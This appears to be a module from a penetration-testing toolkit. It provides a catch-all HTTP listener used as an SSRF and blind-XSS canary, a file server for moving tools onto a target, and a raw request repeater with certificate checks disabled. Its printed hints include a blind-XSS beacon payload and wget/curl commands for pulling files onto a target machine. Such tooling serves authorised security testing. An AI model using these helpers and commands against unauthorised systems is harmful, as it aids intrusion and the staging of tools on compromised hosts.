from __future__ import annotations

import socket
import threading
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer, SimpleHTTPRequestHandler
from pathlib import Path

from rich.prompt import Prompt

from .utils import console, header, pause, report

_hit_count = 0


def _local_ip() -> str:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def catch_all_listener() -> None:
    header("Catch-all HTTP listener", "Logs every incoming request (SSRF/blind-XSS canary)")
    port = int(Prompt.ask("Port", default="8000"))
    global _hit_count
    _hit_count = 0

    class Handler(BaseHTTPRequestHandler):
        def _log(self, method):
            global _hit_count
            _hit_count += 1
            length = int(self.headers.get("Content-Length", 0) or 0)
            body = self.rfile.read(length).decode(errors="replace") if length else ""
            ts = datetime.now().strftime("%H:%M:%S")
            console.print(f"\n[bold green]#{_hit_count}[/] [dim]{ts}[/] "
                          f"[bold]{method}[/] {self.path}  from [cyan]{self.client_address[0]}[/]")
            for k, v in self.headers.items():
                console.print(f"    [dim]{k}:[/] {v}")
            if body:
                console.print(f"    [yellow]body:[/] {body[:500]}")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok\n")

        def do_GET(self):
            self._log("GET")

        def do_POST(self):
            self._log("POST")

        def do_PUT(self):
            self._log("PUT")

        def do_HEAD(self):
            self._log("HEAD")

        def log_message(self, *a):
            pass  # silence default stderr logging

    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    except OSError as e:
        console.print(f"[red]Couldn't bind port {port}: {e}[/]")
        return pause()

    ip = _local_ip()
    console.print(f"[green]Listening on http://{ip}:{port}/[/]  (also 0.0.0.0)")
    console.print(f"[dim]Use payloads like:  http://{ip}:{port}/ssrf-test  or a blind-XSS "
                  f"beacon to <img src=http://{ip}:{port}/x>[/]")
    console.print("[bold]Press Enter to stop.[/]")
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    try:
        input()
    except (KeyboardInterrupt, EOFError):
        pass
    server.shutdown()
    console.print(f"[dim]Stopped. Caught {_hit_count} request(s).[/]")
    if _hit_count:
        report.log("interceptor", "Catch-all listener", [f"- {_hit_count} requests received"])
    pause()


def file_server() -> None:
    header("Quick file server", "Serve a folder over HTTP (transfer tools to a target)")
    directory = Prompt.ask("Directory to serve", default=".").strip('"')
    port = int(Prompt.ask("Port", default="8080"))

    class Handler(SimpleHTTPRequestHandler):
        def __init__(self, *a, **k):
            super().__init__(*a, directory=directory, **k)

        def log_message(self, fmt, *args):
            console.print(f"[dim]{self.client_address[0]}[/] {fmt % args}")

    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), Handler)
    except OSError as e:
        console.print(f"[red]Couldn't bind port {port}: {e}[/]")
        return pause()
    ip = _local_ip()
    console.print(f"[green]Serving {Path(directory).resolve()} at http://{ip}:{port}/[/]")
    console.print(f"[dim]On the target:  wget http://{ip}:{port}/file   |   "
                  f"curl -O http://{ip}:{port}/file[/]")
    console.print("[bold]Press Enter to stop.[/]")
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    try:
        input()
    except (KeyboardInterrupt, EOFError):
        pass
    server.shutdown()
    console.print("[dim]Server stopped.[/]")
    pause()


def request_repeater() -> None:
    header("HTTP repeater", "Craft and replay a raw request (Burp-Repeater lite)")
    import requests
    requests.packages.urllib3.disable_warnings()
    method = Prompt.ask("Method", default="GET").upper()
    url = Prompt.ask("URL")
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    console.print("[dim]Custom headers as key: value, one per line. Blank line to finish.[/]")
    headers = {}
    while True:
        line = console.input("hdr> ").strip()
        if not line:
            break
        if ":" in line:
            k, v = line.split(":", 1)
            headers[k.strip()] = v.strip()
    body = None
    if method in ("POST", "PUT", "PATCH"):
        body = Prompt.ask("Body", default="")
    try:
        r = requests.request(method, url, headers=headers, data=body,
                             timeout=15, verify=False, allow_redirects=False)
    except requests.RequestException as e:
        console.print(f"[red]Request failed: {e}[/]")
        return pause()
    console.print(f"\n[bold]{r.status_code} {r.reason}[/]  ({len(r.content)} bytes, "
                  f"{r.elapsed.total_seconds()*1000:.0f} ms)")
    for k, v in r.headers.items():
        console.print(f"[dim]{k}:[/] {v}")
    console.print("\n[bold]Body:[/]")
    console.print(r.text[:2000])
    pause()


MENU = {
    "1": ("Catch-all listener (SSRF/XSS canary)", catch_all_listener),
    "2": ("Quick file server", file_server),
    "3": ("HTTP request repeater", request_repeater),
}
